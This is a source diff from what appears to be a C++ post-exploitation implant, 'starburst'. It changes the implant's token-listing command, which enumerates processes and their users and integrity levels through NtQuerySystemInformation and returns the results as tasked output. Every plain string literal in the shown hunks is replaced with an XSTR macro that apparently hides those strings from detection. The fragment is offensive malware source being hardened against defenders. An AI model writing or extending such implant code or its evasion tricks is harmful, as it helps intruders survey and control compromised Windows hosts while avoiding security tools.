@@ -22,7 +22,7 @@ auto declfn starburst::cmd_token_list(
     auto buf = static_cast<uint8_t*>( inst.heap_alloc( buf_size ) );
     if ( !buf ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -35,7 +35,7 @@ auto declfn starburst::cmd_token_list(
         buf = static_cast<uint8_t*>( inst.heap_alloc( buf_size ) );
         if ( !buf ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+                XSTR( "alloc failed" ) );
             return;
         }
         status = inst.ntdll.NtQuerySystemInformation(
@@ -45,7 +45,7 @@ auto declfn starburst::cmd_token_list(
     if ( status != 0 ) {
         inst.heap_free( buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "NtQuerySystemInformation failed" ) ) );
+            XSTR( "NtQuerySystemInformation failed" ) );
         return;
     }
 
@@ -55,12 +55,11 @@ auto declfn starburst::cmd_token_list(
     if ( !output ) {
         inst.heap_free( buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
-    str_copy( output, symbol<char*>( const_cast<char*>(
-        "PID\tUser\tIntegrity\tProcess\n" ) ) );
+    str_copy( output, XSTR("PID\tUser\tIntegrity\tProcess\n") );
     uint32_t out_offset = str_len( output );
 
     auto spi = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>( buf );
@@ -147,14 +146,13 @@ auto declfn starburst::cmd_token_list(
 
                 // integrity label
                 char* il_str;
-                if ( integrity >= 0x4000 ) il_str = const_cast<char*>( "System" );
-                else if ( integrity >= 0x3000 ) il_str = const_cast<char*>( "High" );
-                else if ( integrity >= 0x2000 ) il_str = const_cast<char*>( "Medium" );
-                else if ( integrity >= 0x1000 ) il_str = const_cast<char*>( "Low" );
-                else il_str = const_cast<char*>( "Untrusted" );
-                auto il_sym = symbol<char*>( il_str );
-                uint32_t ilen = str_len( il_sym );
-                memory::copy( output + out_offset, il_sym, ilen );
+                if ( integrity >= 0x4000 ) il_str = XSTR( "System" );
+                else if ( integrity >= 0x3000 ) il_str = XSTR( "High" );
+                else if ( integrity >= 0x2000 ) il_str = XSTR( "Medium" );
+                else if ( integrity >= 0x1000 ) il_str = XSTR( "Low" );
+                else il_str = XSTR( "Untrusted" );
+                uint32_t ilen = str_len( il_str );
+                memory::copy( output + out_offset, il_str, ilen );
                 out_offset += ilen;
                 output[out_offset++] = '\t';
 
